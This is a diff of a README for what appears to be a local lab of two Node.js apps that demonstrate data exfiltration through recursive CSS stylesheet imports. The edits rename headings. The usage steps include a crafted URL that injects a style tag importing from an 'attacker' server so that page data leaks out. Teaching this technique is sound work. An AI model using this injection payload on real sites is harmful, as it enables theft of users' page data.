@@ -1,4 +1,4 @@
-# Data exfiltration via recursive CSS stylesheet imports
+# Data exfiltration via recursive stylesheet imports
 
 This repository contains two Node.js applications designed as a test bed for demonstrating and learning how to exfil data using the recursive CSS stylesheet imports technique.
 
@@ -57,9 +57,8 @@ Follow these instructions to set up the environment and run the applications.
     node app.js
     ```
 
-## Demonstration
+## Usage
 
-To see the CSS Exfiltration in action, follow these steps:
 1. Open the victim's site in a browser.
 2. Visit the following 'attacker' crafted link: http://127.0.0.1:5001/?vuln=%22/%3E%3Cstyle%3E@import%20url(http://127.0.0.1:8088/start)%3C/style%3E
 3. Observe how the attacker's site receives data through recursive stylesheet imports.
